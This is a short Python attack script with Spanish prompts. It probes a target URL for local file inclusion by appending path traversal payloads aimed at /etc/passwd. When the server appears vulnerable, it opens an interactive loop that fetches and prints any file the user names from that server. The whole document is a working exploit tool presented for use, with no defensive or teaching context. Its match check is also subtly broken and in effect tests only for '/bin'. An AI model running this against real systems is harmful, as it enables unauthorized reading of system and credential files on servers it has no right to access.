#/usr/bin/env python
#_*_ coding: utf-8 _*_



import requests 
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()

def main(): 
	payloads = ['../../../../../../../../../../../etc/passwd','../../../../../etc/passwd','/etc/passwd']
	if parser.target: 
		print("Objetivo => {}".format(parser.target))
		for p in payloads: 
			print("\n=========================================")
			print("Objetivo = {}".format(parser.target + p))
			query = requests.get(parser.target + p)
			if 'root' and 'bash' and '/bin' in query.text: 
				print("Probable LFI: {}".format(parser.target + p))
				b = BeautifulSoup(query.text, 'html5lib')
				print(b.blockquote.text)
				op = input("Desea consultar archivos? s/n: ")

				if op.lower() == "s": 
					while True:
						files = input("Archivo: ")
						qf = requests.get(parser.target + files)
						if not "Warning" in qf.text: 
							bf = BeautifulSoup(qf.text, 'html5lib') 
							print(bf.blockquote.text)
						else: 
							print("Fallo en la consulta")


			print("\n=============================================")
	else: 
		print("\n			Especifique el Objetivo")

if __name__ == '__main__':
	try: 
		main() 
	except KeyboardInterrupt: 
		exit() 


	